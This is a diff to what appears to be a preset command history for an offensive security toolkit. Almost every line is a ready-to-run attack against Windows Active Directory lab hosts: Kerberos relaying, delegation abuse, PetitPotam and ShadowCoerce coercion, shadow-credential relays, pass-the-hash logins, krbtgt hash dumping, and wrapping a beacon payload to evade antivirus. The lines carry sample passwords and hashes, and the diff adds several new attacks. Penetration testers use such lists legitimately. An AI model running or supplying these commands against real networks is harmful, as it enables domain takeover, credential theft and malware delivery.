@@ -152,6 +152,7 @@ dnstool.py -u 'BREAKING\SV01$' -p aad3b435b51404eeaad3b435b51404ee:c1c635aa12ae6
 krbrelayx.py -aesKey 9ff86898afa70f5f7b9f2bf16320cb38edb2639409e1bc441ac417fac1fed5ab
 addspn.py -u 'BREAKING\serviceaccount' -p P4ssw0rd -t SV01 -s HTTP/SHUTDOWN.BREAKING.BAD --additional DC01.BREAKING.BAD
 dnstool.py -u 'BREAKING\serviceaccount' -p P4ssw0rd -r SHUTDOWN.BREAKING.BAD -d 192.168.56.1 --action add DC01.BREAKING.BAD
+dnstool.py -u 'BREAKING\serviceaccount' -p P4ssw0rd -r SHUTDOWN.BREAKING.BAD -d 192.168.56.1 --action query DC01.BREAKING.BAD
 privexchange.py -u serviceaccount -p P4ssw0rd -ah SHUTDOWN.BREAKING.BAD EXCHANGE.BREAKING.BAD -d BREAKING.BAD
 krbrelayx.py --krbpass P4ssw0rd --krbsalt BREAKING.BADSV01 -t ldap://dc01.breaking.bad --escalate-user serviceaccount
 wfuzz -c --hw 157 -L -w `fzf-wordlists` -w `fzf-wordlists` -X POST -d 'username=FUZZ&password=FUZ2Z' -u http://192.168.10.10/admin
@@ -201,10 +202,10 @@ nmap --script broadcast-dhcp-discover
 SimplyEmail -all -e cybersyndicates.com
 ssh-keygen -t rsa -b 4096 -f keyname
 hashcat --username --hash-type 0 --attack-mode 0 MD5_hashes.txt `fzf-wordlists`
-rbcd.py t-delegate-to 'sv01$' -dc-ip dc01 -action read 'BREAKING\anonymous:anonymous'
-rbcd.py -delegate-from shutdown -delegate-to 'sv01$' -dc-ip dc01 -action write 'BREAKING\anonymous:anonymous'
-rbcd.py -delegate-from shutdown -delegate-to 'sv01$' -dc-ip dc01 -action remove 'BREAKING\anonymous:anonymous'
-xfreerdp /d:BREAKING.BAD /u:someuser /pth:c1c635aa12ae60b7fe39e28456a7bac6 /v:SV01.BREAKING.BAD
+rbcd.py t-delegate-to 'sv01$' -dc-ip dc01 -action read 'BREAKING/anonymous:anonymous'
+rbcd.py -delegate-from 'shutdown' -delegate-to 'sv01$' -dc-ip dc01 -action write 'BREAKING/anonymous:anonymous'
+rbcd.py -delegate-from 'shutdown' -delegate-to 'sv01$' -dc-ip dc01 -action remove 'BREAKING/anonymous:anonymous'
+xfreerdp /d:BREAKING.BAD /u:someuser /pth:c1c635aa12ae60b7fe39e28456a7bac6 /v:SV01.BREAKING.BAD /cert-ignore
 darkarmour -f /data/beacon.exe --encrypt xor --jmp --loop 7 -o /data/legit.exe
 amber -f beacon.exe
 hcxdumptool -I
@@ -297,7 +298,7 @@ dirsearch -r -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.tx
 moodlescan -r -u http://192.168.10.10/
 pywhisker.py -v -d 'domain.local' -u 'user2' -H '126f1f9fdb9a7d9c7ba8d269728b7da0' -t 'sv01$' -a 'add' -o 'sv01'
 gettgtpkinit.py -cert-pfx 'sv01.pfx' -pfx-pass 'RLLXdD5FhNPRphSqKGg8' 'domain.local'/'sv01$' 'sv01.ccache'
-getnthash.py -key '8eb7a6388780dd52eb358769dc53ff685fd135f89c4ef55abb277d7d98995f72' 'domain.local'/'sv01$'
+KRB5CCNAME='sv01.ccache' getnthash.py -key '8eb7a6388780dd52eb358769dc53ff685fd135f89c4ef55abb277d7d98995f72' 'domain.local'/'sv01$'
 petitpotam.py 192.168.56.1 dc01.breaking.bad
 petitpotam.py -d breaking.bad -u someaccount -p somepassword 192.168.56.1 dc01.breaking.bad
 ntlmrelayx -t ldap://dc02.breaking.bad -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
@@ -322,4 +323,9 @@ renameMachine.py -current-name "DC01" -new-name "testcomputer$" -dc-ip dc01 "dom
 KRB5CCNAME="DC01.ccache" getST.py -self -impersonate "domainadmin" -spn "cifs/dc01.domain.local" -k -no-pass -dc-ip dc01 "domain.local"/"dc01"
 KRB5CCNAME="domainadmin.ccache" secretsdump -just-dc-user "krbtgt" -dc-ip dc01 -k -no-pass @"dc01.domain.local"
 KRB5CCNAME="domainadmin.ccache" secretsdump -just-dc-user "krbtgt" -dc-ip dc01 -k -no-pass @"dc01.domain.local"
+pwndb --target @example.com --output txt
+robotstester -u http://www.example.com/ -L
+shadowcoerce.py -d "domain" -u "user1" -p "complexpassword" 192.168.56.1 192.168.56.101
+faketime '2022-01-31 22:05:35' zsh
+manspider --threads 50 192.168.56.0/24 -d BREAKING.BAD -u someuser -H bb38628253e7681553b72e7da3adf305 --content administrateur
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
